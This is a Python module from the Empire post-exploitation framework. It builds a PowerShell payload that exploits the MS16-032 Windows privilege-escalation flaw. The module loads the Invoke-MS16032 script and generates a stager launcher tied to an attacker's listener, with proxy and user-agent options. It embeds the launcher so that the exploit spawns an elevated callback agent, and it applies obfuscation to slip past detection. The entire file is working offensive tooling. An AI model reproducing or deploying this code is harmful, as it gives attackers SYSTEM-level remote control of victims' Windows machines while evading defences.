from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        module_source = main_menu.installPath + "/data/module_source/privesc/Invoke-MS16032.ps1"
        if obfuscate:
            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        module_code = f.read()
        f.close()

        script = module_code

        # generate the launcher code without base64 encoding
        launcher = main_menu.stagers.stagers['multi/launcher']
        launcher.options['Listener'] = params['Listener']
        launcher.options['UserAgent'] = params['UserAgent']
        launcher.options['Proxy'] = params['Proxy']
        launcher.options['ProxyCreds'] = params['ProxyCreds']
        launcher.options['SafeChecks'] = 'False'
        launcher.options['ScriptLogBypass'] = 'False'
        launcher.options['AMSIBypass'] = 'False'
        launcher.options['Base64'] = 'False'
        launcher_code = launcher.generate()

        # need to escape characters
        launcher_code = launcher_code.replace("`", "``").replace("$", "`$").replace("\"", "'")

        script_end = 'Invoke-MS16-032 "' + launcher_code + '"'
        script_end += ';"`nInvoke-MS16032 completed."'

        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end,
                                          obfuscationCommand=obfuscation_command)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
